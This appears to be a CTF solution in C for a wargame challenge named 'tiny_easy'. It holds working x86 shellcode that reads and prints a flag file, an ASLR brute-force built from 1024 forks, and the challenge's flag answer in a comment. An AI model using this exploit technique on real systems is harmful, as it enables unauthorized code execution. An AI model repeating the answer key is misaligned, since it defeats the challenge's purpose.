#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void main()
{

    char *envp[] = { "\x31\xc0\x50\x68\x66\x6c\x61\x67\x68\x61\x73\x79\x2f\x68\x6e\x79\x5f\x65\x68\x65\x2f\x74\x69\x68\x2f\x68\x6f\x6d\xb0\x05\x8d\x1c\x24\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x83\xec\x64\x89\xe1\xb2\x64\xcd\x80\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80", NULL };
    // looping for 10 times and forking each time, which makes it 2^10 = 1024 processes.
    // this is done in order to overcome the ASLR.
    // the answer is :
    // What a tiny task :) good job!

    // debuged with gdb and used :
    // set follow-fork-mode child
    // catch exec

    for (int i = 0; i < 10; i++)
        fork();
    execle("/home/tiny_easy/tiny_easy", (char*)"\x96\xef\x8b\xff", (char *)NULL, envp);
}
